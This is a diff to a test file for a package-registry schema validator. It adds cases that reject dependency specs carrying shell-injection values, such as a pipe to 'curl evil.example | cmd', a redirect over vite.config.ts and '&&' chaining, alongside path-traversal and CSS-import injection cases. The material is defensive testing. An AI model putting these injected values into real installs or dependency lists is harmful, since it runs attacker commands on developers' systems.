@@ -239,6 +239,13 @@ describe('registry schema', () => {
     const item = { name: 'x', type: 'lib', title: 'x', description: '', dependencies: [], registryDependencies: [], css: [], files: [] };
     expect(() => parseItem({ ...item, files: [{ target: '../../.bashrc', content: '' }] }, 'x.json')).toThrow('недопустимый путь');
     expect(() => parseItem({ ...item, dependencies: ['--global'] }, 'x.json')).toThrow('недопустимое значение');
+    // Windows installs through a shell: a spec is one package and one plain version, nothing a shell reads.
+    for (const spec of ['a@1 | curl evil.example | cmd', 'a@1 >vite.config.ts', 'a@1 b', 'a@<2', 'a@1&&b']) {
+      expect(() => parseItem({ ...item, dependencies: [spec] }, 'x.json'), spec).toThrow('недопустимое значение');
+    }
+    for (const spec of ['react', '@base-ui/react@^1.9.0', 'lucide-react@~1.63.0', 'shiki@4.0.0-beta.1', 'x@latest']) {
+      expect(parseItem({ ...item, dependencies: [spec] }, 'x.json').dependencies, spec).toEqual([spec]);
+    }
     expect(() => parseItem({ ...item, css: ['x"; @import "evil'] }, 'x.json')).toThrow('недопустимое значение');
     expect(parseItem(item, 'x.json').name).toBe('x');
   });
